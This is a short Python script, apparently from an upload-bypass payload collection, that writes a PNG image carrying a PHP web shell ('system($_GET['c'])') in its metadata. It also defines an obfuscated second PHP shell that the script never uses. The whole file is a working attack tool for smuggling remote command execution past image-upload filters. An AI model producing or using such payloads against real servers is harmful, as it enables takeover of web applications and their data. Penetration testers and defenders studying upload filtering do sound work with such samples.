from __future__ import print_function
from PIL import Image
shellcode = "<?php system($_GET['c']); ?>"
shellcode2 = "<?='Sh3ll'; $_='{';$_=($_^'<').($_^'>;').($_^'/');?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>"
print("\n[+] Advanced Upload - Shell inside metadatas of a PNG file")
print(" - Creating a payload.png")
im = Image.new("RGB", (10,10), "Black")
im.info["shell"] = shellcode
reserved = ('interlace', 'gamma', 'dpi', 'transparency', 'aspect')
from PIL import PngImagePlugin
meta = PngImagePlugin.PngInfo()
for k,v in im.info.items():
	if k in reserved: continue
	meta.add_text(k, v, 0)
im.save("payload.png", "PNG", pnginfo=meta)
print("Done")